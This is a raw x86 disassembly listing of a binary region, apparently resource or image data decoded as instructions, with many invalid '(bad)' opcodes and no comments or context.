  405151:	add    BYTE PTR [eax],al
  405153:	add    eax,DWORD PTR [eax-0x7fff0000]
  405159:	add    BYTE PTR [eax],al
  40515b:	add    DWORD PTR [eax-0x7fff0000],eax
  405161:	add    BYTE PTR [eax],al
  405163:	add    DWORD PTR [eax-0x1fff0000],eax
  405169:	add    BYTE PTR [eax],al
  40516b:	add    esp,edi
  40516d:	add    BYTE PTR [eax],al
  40516f:	add    edi,edi
  405171:	add    BYTE PTR [eax],al
  405173:	add    edi,edi
  405175:	add    BYTE PTR [eax],0x3
  405178:	inc    DWORD PTR [eax-0x700000f9]
  40517e:	(bad)  
  40517f:	(bad)  
  405180:	(bad)  
  405181:	(bad)  
  405182:	(bad)  
  405183:	(bad)  
  405184:	(bad)  
  405185:	(bad)  
  405186:	(bad)  
  405187:	jmp    FWORD PTR [eax]
  405189:	add    BYTE PTR [eax],al
  40518b:	add    BYTE PTR [eax],dl
  40518d:	add    BYTE PTR [eax],al
  40518f:	add    BYTE PTR [eax],ah
  405191:	add    BYTE PTR [eax],al
  405193:	add    BYTE PTR [ecx],al
  405195:	add    BYTE PTR [eax+eax*1],al
  405198:	add    BYTE PTR [eax],al
  40519a:	add    BYTE PTR [eax],al
  40519c:	add    BYTE PTR [eax],0x0
	...
  4051b3:	add    BYTE PTR [eax],al
  4051b5:	add    BYTE PTR [eax+0x800000],al
  4051bb:	add    BYTE PTR [eax],al
  4051bd:	add    BYTE PTR [eax+0x8000],0x0
  4051c4:	add    BYTE PTR [eax],0x80
  4051c7:	add    BYTE PTR [eax-0x7fffff80],al
  4051cd:	add    BYTE PTR [eax-0x3f3f4000],0x0
  4051d4:	add    BYTE PTR [eax],al
  4051d6:	inc    DWORD PTR [eax]
  4051d8:	add    bh,bh
  4051da:	add    BYTE PTR [eax],al
  4051dc:	add    bh,bh
  4051de:	inc    DWORD PTR [eax]
  4051e0:	inc    DWORD PTR [eax]
  4051e2:	add    BYTE PTR [eax],al
  4051e4:	inc    DWORD PTR [eax]
  4051e6:	inc    DWORD PTR [eax]
  4051e8:	(bad)  
  4051e9:	inc    DWORD PTR [eax]
  4051eb:	add    bh,bh
  4051ed:	(bad)  
  4051ee:	inc    DWORD PTR [eax]
	...
  4051f8:	ja     0x40526a
  4051fa:	add    BYTE PTR [eax+0x808787],cl
  405200:	xchg   DWORD PTR [eax-0x78770800],eax
  405206:	add    BYTE PTR [eax],al
  405208:	mov    BYTE PTR [eax+0x70870000],al
  40520e:	add    BYTE PTR [eax],al
  405210:	mov    BYTE PTR [eax-0x77777778],cl
  405216:	js     0x405290
  405218:	mov    BYTE PTR [eax-0x77777778],cl
  40521e:	mov    BYTE PTR [eax-0x3b7b7778],cl
  405224:	inc    edi
  405225:	int3   
  405226:	(bad)  
  405227:	mov    BYTE PTR [eax-0x78837b78],cl
  40522d:	(bad)  
  40522e:	int3   
  40522f:	mov    BYTE PTR [edx-0x307988],cl
  405235:	mov    WORD PTR [esi-0x7a877e78],es
  40523b:	push   0x88c8f7c7
  405240:	mov    BYTE PTR [edi-0x70333384],cl
  405246:	into   
  405247:	mov    BYTE PTR [eax],al
  405249:	or     BYTE PTR [esi+eax*8-0x77733032],al
  405250:	add    BYTE PTR [eax],cl
  405252:	mov    esp,cs
  405254:	enter  0xe777,0x88
  405258:	add    BYTE PTR [eax],cl
  40525a:	xchg   DWORD PTR [eax-0x77777788],ecx
  405260:	add    BYTE PTR [eax],cl
  405262:	mov    BYTE PTR [eax-0x70777778],cl
	...
  405270:	(bad)  
  405271:	inc    DWORD PTR [eax]
  405273:	add    BYTE PTR [edi+eax*1],bl
  405276:	add    BYTE PTR [eax],al
  405278:	sbb    al,0xf
  40527a:	add    BYTE PTR [eax],al
  40527c:	pop    ds
  40527d:	pop    ds
	...
  40529a:	add    BYTE PTR [eax],al
  40529c:	loopne 0x40529e
  40529e:	add    BYTE PTR [eax],al
  4052a0:	loopne 0x4052a2
  4052a2:	add    BYTE PTR [eax],al
  4052a4:	loopne 0x4052a6
  4052a6:	add    BYTE PTR [eax],al
  4052a8:	loopne 0x4052aa
  4052aa:	add    BYTE PTR [eax],al
  4052ac:	(bad)  
  4052ad:	inc    DWORD PTR [eax]
  4052af:	add    BYTE PTR [eax],ch
  4052b1:	add    BYTE PTR [eax],al
  4052b3:	add    BYTE PTR [eax],dh
  4052b5:	add    BYTE PTR [eax],al
  4052b7:	add    BYTE PTR [eax+0x0],ah
  4052ba:	add    BYTE PTR [eax],al
  4052bc:	add    DWORD PTR [eax],eax
  4052be:	or     BYTE PTR [eax],al
  4052c0:	add    BYTE PTR [eax],al
  4052c2:	add    BYTE PTR [eax],al
  4052c4:	add    BYTE PTR [ecx],cl
	...
  4052ce:	add    BYTE PTR [eax],al
  4052d0:	add    BYTE PTR [ecx],al
  4052d2:	add    BYTE PTR [eax],al
  4052d4:	add    BYTE PTR [ecx],al
  4052d6:	add    BYTE PTR [eax],al
  4052d8:	add    BYTE PTR [eax],al
  4052da:	add    BYTE PTR [eax],al
  4052dc:	daa    
  4052dd:	add    BYTE PTR [edx],al
  4052df:	add    BYTE PTR [eax+eax*1+0x0],bh
  4052e3:	add    BYTE PTR [edx+0x18],bh
  4052e6:	or     eax,0x1a237c00
  4052eb:	add    BYTE PTR [edi+0x30],bh
  4052ee:	daa    
  4052ef:	add    BYTE PTR [esi],al
  4052f1:	push   esp
  4052f2:	sbb    eax,DWORD PTR [eax]
  4052f4:	dec    esi
  4052f5:	dec    esi
  4052f6:	dec    esi
  4052f7:	add    BYTE PTR [ebx+ecx*2+0x43],dl
  4052fb:	add    BYTE PTR [ebp+0x5e],bl
  4052fe:	pop    esi
  4052ff:	add    BYTE PTR [ebx+0x44],ah
  405302:	push   ebp
  405303:	add    BYTE PTR [ebx+0x63],ah
  405306:	arpl   WORD PTR [eax],ax
  405308:	push   0x66006564
  40530d:	addr16 push 0x6a6a6a00
  405313:	add    BYTE PTR [ebp+ebp*2+0x6c],bh
  405317:	add    BYTE PTR [ecx+0x71],dh
  40531a:	jno    0x40531c
  40531c:	jge    0x405390
  40531e:	je     0x405320
  405320:	js     0x40539a
  405322:	ja     0x405324
  405324:	jnp    0x4053a1
  405326:	jnp    0x405328
  405328:	mov    BYTE PTR [edi],al
  40532a:	add    BYTE PTR [eax],al
  40532c:	xchg   esi,eax
  40532d:	or     al,BYTE PTR [eax]
  40532f:	add    BYTE PTR [ecx-0x66fff6ed],cl
  405335:	adc    al,BYTE PTR [eax+eax*1]
  405338:	lea    ebx,[edx*1+0x111a9000]
  40533f:	add    BYTE PTR [eax+ecx*1+0xab60000],ah
  405346:	add    BYTE PTR [eax],al
  405348:	test   al,0x15
  40534a:	add    DWORD PTR [eax],eax
  40534c:	mov    eax,0xb4000018
  405351:	sbb    DWORD PTR [ebx],edx
  405353:	add    BYTE PTR [ebx-0x68ffe3dc],cl
  405359:	es sbb al,0x0
  40535c:	lods   al,BYTE PTR ds:[esi]
  40535d:	and    BYTE PTR [eax+eax*1],cl
  405360:	mov    ebp,0xaa000c22
  405365:	daa    
  405366:	pop    ss
  405367:	add    BYTE PTR [ebx-0x47ffe8d6],dh
  40536d:	xor    DWORD PTR ds:0x262b9700,ebx
  405373:	add    BYTE PTR [ebp-0x69ffd6ce],al
  405379:	xor    eax,0x3c8b002d
  40537e:	add    BYTE PTR ss:[eax-0x46ffccc7],bl
  405385:	aaa    
  405386:	add    BYTE PTR es:[esi-0x39ffcdc4],ah
  40538d:	sbb    eax,DWORD PTR [eax]
  40538f:	add    ah,dl
  405391:	sbb    eax,DWORD PTR [eax]
  405393:	add    cl,dh
  405395:	or     eax,DWORD PTR [eax]
  405397:	add    cl,ch
  405399:	sbb    al,BYTE PTR [eax]
  40539b:	add    dl,al
  40539d:	and    ecx,DWORD PTR [ecx]
  40539f:	add    bh,dl
  4053a1:	and    al,BYTE PTR [eax]
  4053a3:	add    bh,al
  4053a5:	cs adc al,0x0
  4053a8:	out    0x23,al
  4053aa:	add    BYTE PTR [eax],al
  4053ac:	repz and al,0x0
  4053af:	add    dh,ah
  4053b1:	cmp    eax,0x37f5001d
  4053b6:	adc    DWORD PTR [eax],eax
  4053b8:	les    edi,FWORD PTR ds:0x3bd1002a
  4053be:	and    al,BYTE PTR [eax]
  4053c0:	fwait
  4053c1:	inc    edx
  4053c2:	add    BYTE PTR ss:[edx+eax*2+0x43bc003a],ah
  4053ca:	xor    eax,DWORD PTR [eax]
  4053cc:	mov    DWORD PTR [edx+0x2c],0x3448c900
  4053d3:	add    dh,dl
  4053d5:	dec    esi
  4053d6:	aaa    
  4053d7:	add    dl,cl
  4053d9:	push   ecx
  4053da:	ds add dh,dh
  4053dd:	push   esi
  4053de:	xor    al,0x0
  4053e0:	xchg   esp,eax
  4053e1:	dec    esp
  4053e2:	inc    edi
  4053e3:	add    BYTE PTR [ecx-0x59ffadaa],bl
  4053e9:	dec    edx
  4053ea:	inc    esi
  4053eb:	add    BYTE PTR [ecx-0x4bffb7b0],ch
  4053f1:	push   ecx
  4053f2:	inc    esp
  4053f3:	add    BYTE PTR [ebp-0x4dffada7],ch
  4053f9:	pop    esp
  4053fa:	push   ebp
  4053fb:	add    BYTE PTR [ebp-0x57ffa69f],bl
  405401:	pusha  
  405402:	pop    ebp
  405403:	add    BYTE PTR [esi-0x76ffa69d],dh
  405409:	fs popa 
  40540b:	add    BYTE PTR [edi-0x63ff9a9a],dl
  405411:	jno    0x405480
  405413:	add    BYTE PTR [esi-0x56ff8f8b],bl
  405419:	push   0x61
  40541b:	add    BYTE PTR [edi-0x57ff9592],dh
  405421:	jb     0x40548c
  405423:	add    BYTE PTR [ecx-0x58ff948c],bh
  405429:	jg     0x4054a5
  40542b:	add    BYTE PTR [esi-0x37ff8d86],bh
  405431:	push   ebp
  405432:	inc    esp
  405433:	add    ah,dl
  405435:	pop    ecx
  405436:	inc    ebp
  405437:	add    ah,ah
  405439:	pop    edi
  40543a:	inc    edi
  40543b:	add    dh,cl
  40543d:	pusha  
  40543e:	dec    esi
  40543f:	add    ah,dl
  405441:	pusha  
  405442:	dec    ebp
  405443:	add    cl,cl
  405445:	addr16 pop eax
  405447:	add    dl,bl
  405449:	push   0x6ce50054
  40544e:	push   esi
  40544f:	add    bl,ah
  405451:	jb     0x4054b0
  405453:	add    dh,dh
  405455:	jb     0x4054af
  405457:	add    al,cl
  405459:	jbe    0x4054c5
  40545b:	add    dh,bl
  40545d:	js     0x4054c6
  40545f:	add    dh,dl
  405461:	jg     0x4054d4
  405463:	add    dh,ah
  405465:	jnp    0x4054cf
  405467:	add    BYTE PTR [esi],bh
  405469:	xchg   esp,eax
  40546a:	add    BYTE PTR [si],dh
  40546d:	int    0x7e
  40546f:	add    BYTE PTR [eax],al
  405471:	jmp    FWORD PTR [ebx+0x0]
  405474:	test   BYTE PTR [eax-0x7c52ff82],al
  40547a:	jl     0x40547c
  40547c:	mov    BYTE PTR [edx+edi*2+0x6c81eb00],0x0
  405484:	hlt    
  405485:	sub    DWORD PTR [edx+0x0],0x7587ea
  40548c:	cmc    
  40548d:	lea    edi,[ecx+0x0]
  405490:	clc    
  405491:	xchg   ecx,eax
  405492:	jl     0x405494
  405494:	jg     0x405515
  405496:	add    DWORD PTR [eax],0x807f9c
  40549c:	jg     0x40541f
  40549e:	add    DWORD PTR [eax],0x91a37a
  4054a4:	je     0x40545d
  4054a6:	fwait
  4054a7:	add    BYTE PTR [ecx-0x25],ah
  4054aa:	pushf  
  4054ab:	add    BYTE PTR [ebx+eax*4-0x7a7aff7c],al
  4054b2:	mov    DWORD PTR [eax],eax
  4054b4:	mov    BYTE PTR [edi-0x7474ff76],al
  4054ba:	mov    WORD PTR [eax],es
  4054bc:	popf   
  4054bd:	mov    DWORD PTR [edx-0x706e7000],ecx
  4054c3:	add    BYTE PTR [ebp+ecx*4-0x706dff6e],cl
  4054ca:	xchg   ebp,eax
  4054cb:	add    BYTE PTR [ebx-0x6cff686d],cl
  4054d1:	xchg   ebx,eax
  4054d2:	xchg   ebx,eax
  4054d3:	add    BYTE PTR [eax-0x6cff6869],bl
  4054d9:	xchg   edi,eax
  4054da:	fwait
  4054db:	add    BYTE PTR [eax-0x6aff646a],bl
  4054e1:	cdq    
  4054e2:	popf   
  4054e3:	add    BYTE PTR [ebx-0x56ff6466],bl
  4054e9:	mov    ecx,DWORD PTR [eax-0x7f784800]
  4054ef:	add    BYTE PTR [ebx-0x5bff746e],ah
  4054f5:	pushf  
  4054f6:	fwait
  4054f7:	add    BYTE PTR [ebp-0x6aff6b69],dh
  4054fd:	test   eax,0xa0a4009d
  405502:	lahf   
  405503:	add    BYTE PTR [eax-0x66ff625f],bh
  405509:	popf   
  40550a:	mov    ds:0xa09ca900,al
  40550f:	add    BYTE PTR [eax-0x6eff5359],bl
  405515:	mov    ebx,0xa3a300a7
  40551a:	mov    ds:0xa5a5a800,eax
  40551f:	add    BYTE PTR [ecx-0x5bff5857],ch
  405525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405526:	stos   BYTE PTR es:[edi],al
  405527:	add    BYTE PTR [eax+ebp*4-0x5453ff54],ah
  40552e:	lods   al,BYTE PTR ds:[esi]
  40552f:	add    BYTE PTR [eax-0x46ff5c5c],dh
  405535:	mov    ds:0xa9bc00a0,al
  40553a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40553b:	add    BYTE PTR [ebx-0x4eff5759],dh
  405541:	lods   al,BYTE PTR ds:[esi]
  405542:	lods   al,BYTE PTR ds:[esi]
  405543:	add    BYTE PTR [edx-0x4dff5454],bh
  405549:	mov    al,0xae
  40554b:	add    BYTE PTR [edi+ebp*4-0x5254ff4d],ah
  405552:	mov    al,0x0
  405554:	mov    cl,0xaf
  405556:	mov    al,0x0
  405558:	mov    esp,0xa300b4ae
  40555d:	mov    al,0xb4
  40555f:	add    BYTE PTR [eax-0x56ff484e],ch
  405565:	mov    dh,0xbc
  405567:	add    BYTE PTR [esi-0x4bff4446],ch
  40556d:	mov    bl,0xb3
  40556f:	add    BYTE PTR [ebx-0x43ff4c4d],bh
  405575:	mov    eax,0xb6b000b5
  40557a:	mov    edx,0xbab9b500
  40557f:	add    BYTE PTR [ebx-0x3bff4446],bh
  405585:	nop
  405586:	mov    DWORD PTR [eax],eax
  405588:	(bad)  
  405589:	call   0x85:0x95ea0091
  405590:	neg    BYTE PTR [ecx-0x6012ff79]
  405596:	nop
  405597:	add    al,cl
  405599:	mov    ds:0xa8db009e,eax
  40559e:	fwait
  40559f:	add    al,ch
  4055a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055a2:	mov    es,WORD PTR [eax]
  4055a4:	cmc    
  4055a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055a6:	mov    es,WORD PTR [eax]
  4055a8:	jmp    0x98a8:0xf80094a5
  4055af:	add    bl,ch
  4055b1:	mov    ch,0x9e
  4055b3:	add    bl,bh
  4055b5:	mov    bl,0x95
  4055b7:	add    ah,al
  4055b9:	stos   BYTE PTR es:[edi],al
  4055ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055bb:	add    bl,bl
  4055bd:	lods   al,BYTE PTR ds:[esi]
  4055be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055bf:	add    dh,al
  4055c1:	mov    dl,0xac
  4055c3:	add    dh,dl
  4055c5:	mov    dh,0xac
  4055c7:	add    ch,al
  4055c9:	test   eax,0xb0c600b6
  4055ce:	mov    al,0x0
  4055d0:	leave  
  4055d1:	mov    eax,0xbcc300b6
  4055d6:	mov    esp,0xbcbdcc00
  4055db:	add    cl,dl
  4055dd:	mov    ebp,0xbae800ba
  4055e2:	test   eax,0xa6b7fd00
  4055e7:	add    ch,bh
  4055e9:	mov    edi,0xc1b900b3
  4055ee:	mov    esi,0xb8c1da00
  4055f3:	add    dh,bh
  4055f5:	ret    
  4055f6:	stos   DWORD PTR es:[edi],eax
  4055f7:	add    bh,ah
  4055f9:	lds    edi,FWORD PTR [eax-0x49370300]
  4055ff:	add    bh,bh
  405601:	sar    DWORD PTR [ebp-0x3d425200],1
  405607:	add    BYTE PTR [edi-0x3cff3d41],dh
  40560d:	mov    ebp,0xc2ba00c1
  405612:	ret    
  405613:	add    BYTE PTR [ebx-0x44ff373d],dh
  405619:	(bad)  
  40561a:	leave  
  40561b:	add    BYTE PTR [edi-0x44ff3438],dh
  405621:	retf   0xcd
  405624:	ret    
  405625:	ret    
  405626:	les    eax,FWORD PTR [eax]
  405628:	retf   
  405629:	(bad)  
  40562a:	lds    eax,FWORD PTR [eax]
  40562c:	iret   
  40562d:	enter  0xc7,0xc4
  405631:	(bad)  
  405632:	leave  
  405633:	add    ah,cl
  405635:	(bad)  
  405636:	enter  0xc100,0xc9
  40563a:	retf   
  40563b:	add    bl,cl
  40563d:	retf   
  40563e:	retf   
  40563f:	add    ch,dl
  405641:	retf   0xc7
  405644:	(bad)  
  405645:	ror    edi,1
  405647:	add    ch,al
  405649:	into   
  40564a:	rol    BYTE PTR [eax],cl
  40564c:	iret   
  40564d:	iret   
  40564e:	rol    BYTE PTR [eax],1
  405650:	(bad)
  405653:	add    ch,cl
  405655:	rcl    ah,cl
  405657:	add    dh,cl
  405659:	(bad)  
  40565a:	fadd   DWORD PTR [eax]
  40565c:	retf   0xdcda
  40565f:	add    dl,dl
  405661:	rcl    ebx,cl
  405663:	add    dl,bl
  405665:	aam    0xd3
  405667:	add    ah,dl
  405669:	xlat   BYTE PTR ds:[ebx]
  40566a:	fadd   DWORD PTR [eax]
  40566c:	aam    0xd9
  40566e:	fild   DWORD PTR [eax]
  405670:	fcmovnu st,st(3)
  405672:	fild   DWORD PTR [eax]
  405674:	dec    dh
  405676:	les    eax,FWORD PTR [eax]
  405678:	in     eax,dx
  405679:	xlat   BYTE PTR ds:[ebx]
  40567a:	int    0x0
  40567c:	(bad)  
  40567d:	(bad)  
  40567e:	mov    DWORD PTR [eax],0xd2dcfe
  405684:	jmp    esp
  405686:	fiadd  DWORD PTR [eax]
  405688:	into   
  405689:	fsubrp st(1),st
  40568b:	add    bl,dl
  40568d:	fsubrp st(1),st
  40568f:	add    dl,bl
  405691:	(bad)  
  405693:	add    cl,bl
  405695:	loop   0x40567a
  405697:	add    dl,ah
  405699:	jecxz  0x40567e
  40569b:	add    cl,ch
  40569d:	out    0xe6,eax
  40569f:	add    cl,ah
  4056a1:	out    0xea,eax
  4056a3:	add    bh,ah
  4056a5:	jmp    0xec2b5793
  4056aa:	jmp    0x4056ac
  4056ac:	(bad)  
  4056ad:	jmp    0x405694
  4056af:	add    bh,bh
  4056b1:	lock jmp 0xee00:0xf0eee700
  4056b9:	repnz cmc 
  4056bb:	add    bl,dh
  4056bd:	hlt    
  4056be:	hlt    
  4056bf:	add    bh,bh
  4056c1:	cmc    
  4056c2:	lock add dh,dh
  4056c5:	clc    
  4056c6:	stc    
  4056c7:	add    dh,bh
  4056c9:	(bad)  
  4056ca:	inc    BYTE PTR [eax]
	...
  4056d4:	(bad)  
  4056d5:	(bad)  
  4056d6:	inc    DWORD PTR [eax]
	...
  405780:	add    ch,bl
  405782:	fstp   st(5)
  405784:	fstp   st(5)
  405786:	stos   BYTE PTR es:[edi],al
  405787:	int    0x0
	...
  4057ad:	add    ch,bl
  4057af:	fstp   st(5)
  4057b1:	lock icebp 
  4057b3:	lock lock out 0xe6,al
  4057b7:	out    0xdd,al
  4057b9:	rcl    DWORD PTR [ebp+0xd3],cl
	...
  4057db:	add    BYTE PTR [edx-0x19192223],ch
  4057e1:	out    0xe6,al
  4057e3:	in     al,0xdd
  4057e5:	fstp   st(5)
  4057e7:	lock out 0xd3,al
  4057ea:	stos   BYTE PTR es:[edi],al
  4057eb:	fst    QWORD PTR [ebp+0x95]
	...
  405809:	add    bl,dl
  40580b:	fstp   st(5)
  40580d:	fstp   st(5)
  40580f:	fucom  st(6)
  405811:	out    0xe6,al
  405813:	out    0xdd,al
  405815:	fstp   st(5)
  405817:	lock fstp QWORD PTR [ebx+edx*8-0x7c2c552a]
	...
  405837:	add    BYTE PTR [eax],al
  405839:	fst    st(3)
  40583b:	ror    ebp,cl
  40583d:	(bad)  
  40583e:	(bad)  
  405840:	fucom  st(6)
  405842:	out    0xf0,al
  405844:	fstp   st(1)
  405846:	(bad)  
  405848:	int    0xd3
  40584a:	fldenv [ebp+0x78d39595]
	...
  405868:	add    BYTE PTR [edi-0x29325556],ah
  40586e:	(bad)  
  405870:	out    0xe6,al
  405872:	out    0xe6,al
  405874:	fstp   st(1)
  405876:	aad    0xdd
  405878:	(bad)
  40587b:	pushf  
  40587c:	xchg   edx,eax
  40587d:	adc    DWORD PTR [eax+0x8a],0x0
	...
  405898:	add    BYTE PTR [edx-0x403a5557],ch
  40589e:	int    0xd9
  4058a0:	(bad)  
  4058a2:	out    0xdd,al
  4058a4:	fst    st(3)
  4058a6:	(bad)  
  4058a7:	int    0xc5
  4058a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058aa:	xchg   ebp,eax
  4058ab:	nop
  4058ac:	jle    0x405928
  4058ae:	nop
  4058af:	nop
	...
  4058c8:	add    ch,bl
  4058ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058cb:	stos   BYTE PTR es:[edi],al
  4058cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058cd:	(bad)
  4058d0:	(bad)  
  4058d2:	(bad)  
  4058d4:	fxch   st(5)
  4058d6:	int    0xa7
  4058d8:	pushf  
  4058d9:	nop
  4058da:	jle    0x405956
  4058dc:	jp     0x40595d
  4058de:	lahf   
  4058df:	jle    0x4058e1
	...
  4058e9:	add    BYTE PTR [eax],al
  4058eb:	outs   dx,DWORD PTR ds:[esi]
  4058ec:	jp     0x40595d
	...
  4058fa:	xchg   ebp,eax
  4058fb:	fst    st(3)
  4058fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058fe:	test   eax,0xcdc5cdc5
  405903:	mov    edi,0x7f909ca9
  405908:	jne    0x40591a
  40590a:	or     eax,0x95907e71
  40590f:	nop
  405910:	add    BYTE PTR [eax+0xd3],dl
  405916:	add    BYTE PTR [eax],al
  405918:	add    BYTE PTR [eax],al
  40591a:	push   cs
  40591b:	pushf  
  40591c:	xor    eax,0xffffffe4
  40591f:	or     al,0xe
  405921:	pop    es
  405922:	or     al,0x90
  405924:	outs   dx,DWORD PTR ds:[esi]
  405925:	add    BYTE PTR [eax],al
  405927:	add    BYTE PTR [eax],al
  405929:	add    BYTE PTR [eax],al
  40592b:	nop
  40592c:	xchg   ebp,eax
  40592d:	(bad)  
  40592e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40592f:	pushf  
  405930:	nop
  405931:	nop
  405932:	nop
  405933:	jg     0x4059ac
  405935:	adc    edx,DWORD PTR [eax]
  405937:	or     eax,0x83750d09
  40593c:	xchg   ebp,eax
  40593d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40593e:	stos   BYTE PTR es:[edi],al
  40593f:	stos   BYTE PTR es:[edi],al
  405940:	out    0xe6,al
  405942:	nop
  405943:	add    BYTE PTR [eax],al
  405945:	add    BYTE PTR [eax],al
  405947:	add    BYTE PTR [eax],al
  405949:	(bad)  
  40594a:	pushf  
  40594b:	xchg   ecx,eax
  40594c:	jle    0x4058e7
  40594e:	fst    st(3)
  405950:	jle    0x4059ca
  405952:	adc    BYTE PTR [edi-0x23],bh
  405955:	int    0x13
  405957:	add    BYTE PTR [eax],al
  405959:	add    BYTE PTR [eax],al
  40595b:	add    BYTE PTR [eax],al
  40595d:	jle    0x4059de
  40595f:	nop
  405960:	xchg   edx,eax
  405961:	nop
  405962:	adc    edx,DWORD PTR [bp+si]
  405965:	adc    esi,DWORD PTR [ecx+0x77]
  405968:	mov    dl,BYTE PTR [esp+ebx*4-0x315a5661]
  40596f:	(bad)  
  405971:	mov    edi,0x90
  405976:	add    BYTE PTR [eax],al
  405978:	add    bl,dl
  40597a:	xchg   ecx,eax
  40597b:	pushf  
  40597c:	sbb    DWORD PTR [edi-0x566a6a23],0x78
  405983:	push   cs
  405984:	jno    0x405a05
  405986:	(bad)  [edx+0x71]
  40598c:	add    BYTE PTR [eax],al
  40598e:	add    BYTE PTR [eax],al
  405990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405991:	jg     0x405a0a
  405993:	ja     0x405a0f
  405995:	jp     0x405a16
  405997:	mov    dl,BYTE PTR [ebp+ebx*4-0x131e2e5c]
  40599e:	in     al,0xda
  4059a0:	fst    st(3)
  4059a2:	xchg   ebp,eax
  4059a3:	add    BYTE PTR [eax],al
  4059a5:	add    BYTE PTR [eax],al
  4059a7:	add    BYTE PTR [eax],al
  4059a9:	xlat   BYTE PTR ds:[ebx]
  4059aa:	xchg   ebp,eax
  4059ab:	pushf  
  4059ac:	xchg   ecx,eax
  4059ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ae:	int    0xa9
  4059b0:	stos   BYTE PTR es:[edi],al
  4059b1:	pushf  
  4059b2:	(bad)  
  4059b4:	xchg   edx,eax
  4059b5:	adc    ch,BYTE PTR [edi+0x7a]
  4059b8:	stc    
  4059b9:	nop
  4059ba:	jne    0x4059bc
  4059bc:	add    BYTE PTR [eax],al
  4059be:	lahf   
  4059bf:	mov    WORD PTR [esi+0x78],?
  4059c2:	js     0x405a3e
  4059c4:	jge    0x405a43
  4059c6:	mov    cs,ebx
  4059c8:	(bad)  
  4059ca:	(bad)  
  4059cb:	mov    ecx,0x1e2d3e62
  4059d0:	cwde   
  4059d1:	loope  0x405963
  4059d3:	fld    QWORD PTR [eax]
  4059d5:	add    BYTE PTR [eax],al
  4059d7:	add    BYTE PTR [eax],al
  4059d9:	shl    DWORD PTR [eax-0x55586359],cl
  4059df:	js     0x405964
  4059e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059e3:	int    0xf4
  4059e5:	stc    
  4059e6:	jp     0x4059f4
  4059e8:	or     eax,0x90908377
  4059ed:	mov    WORD PTR [eax-0x5e717d81],es
  4059f3:	lahf   
  4059f4:	pushf  
  4059f5:	mov    ebp,0x245b69b0
  4059fa:	sbb    ebx,DWORD PTR [edx]
  4059fc:	sbb    bl,BYTE PTR [edx+ebx*1]
  4059ff:	sbb    al,0x8b
  405a01:	loope  0x405998
  405a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a04:	add    BYTE PTR [eax],al
  405a06:	add    BYTE PTR [eax],al
  405a08:	add    dh,dl
  405a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a0b:	mov    edi,0x8ccdcd99
  405a10:	jg     0x405a90
  405a12:	jg     0x405a92
  405a14:	jle    0x405a95
  405a16:	jg     0x4059a4
  405a18:	xchg   ebx,eax
  405a19:	xchg   esp,eax
  405a1a:	popf   
  405a1b:	mov    ds:0x99a4cba2,al
  405a20:	cwde   
  405a21:	stos   DWORD PTR es:[edi],eax
  405a22:	push   ecx
  405a23:	inc    esi
  405a24:	and    DWORD PTR [edx],ebx
  405a26:	sbb    bl,BYTE PTR [edx]
  405a28:	sbb    ah,BYTE PTR [ecx]
  405a2a:	and    esp,DWORD PTR [ebx]
  405a2c:	and    al,0x23
  405a2e:	and    DWORD PTR [edx],esp
  405a30:	stos   DWORD PTR es:[edi],eax
  405a31:	in     al,dx
  405a32:	pushf  
  405a33:	xchg   ebp,eax
  405a34:	add    BYTE PTR [eax],al
  405a36:	add    BYTE PTR [eax],al
  405a38:	add    bl,dl
  405a3a:	int    0xcd
  405a3c:	xchg   ebp,eax
  405a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a3e:	test   eax,0x7a838a83
  405a43:	jle    0x405abf
  405a45:	jb     0x4059d3
  405a47:	mov    eax,ds:0x98d3d2ce
  405a4c:	test   DWORD PTR [ecx+0x44],edx
  405a4f:	es adc eax,0x15141414
  405a55:	pop    ss
  405a56:	and    esp,DWORD PTR ds:0x25242523
  405a5c:	and    eax,0x69222525
  405a61:	in     al,dx
  405a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a63:	xchg   ebp,eax
  405a64:	add    BYTE PTR [eax],al
  405a66:	add    BYTE PTR [eax],al
  405a68:	add    dh,dl
  405a6a:	aam    0xd4
  405a6c:	pushf  
  405a6d:	stos   BYTE PTR es:[edi],al
  405a6e:	int    0x83
  405a70:	mov    bl,BYTE PTR [edi-0x34347d81]
  405a76:	pushf  
  405a77:	test   BYTE PTR [edx+0x44],cl
  405a7a:	es push ss
  405a7c:	add    al,BYTE PTR [edx]
  405a7e:	add    al,BYTE PTR [edx]
  405a80:	adc    al,0x15
  405a82:	sbb    bl,BYTE PTR [edx]
  405a84:	pop    ss
  405a85:	and    al,0x2b
  405a87:	sub    ebp,DWORD PTR [ebx]
  405a89:	sub    edi,DWORD PTR [eax]
  405a8b:	cmp    BYTE PTR [eax],bh
  405a8d:	cmp    eax,0xec60333d
  405a92:	stos   BYTE PTR es:[edi],al
  405a93:	nop
  405a94:	add    BYTE PTR [eax],al
  405a96:	add    BYTE PTR [eax],al
  405a98:	add    bl,dl
  405a9a:	(bad)  
  405a9c:	pushf  
  405a9d:	stos   BYTE PTR es:[edi],al
  405a9e:	stos   BYTE PTR es:[edi],al
  405a9f:	nop
  405aa0:	nop
  405aa1:	lahf   
  405aa2:	popf   
  405aa3:	jns    0x405ace
  405aa5:	es push ss
  405aa7:	adc    al,0x2
  405aa9:	add    al,BYTE PTR [edx]
  405aab:	add    al,BYTE PTR [edx]
  405aad:	push   ss
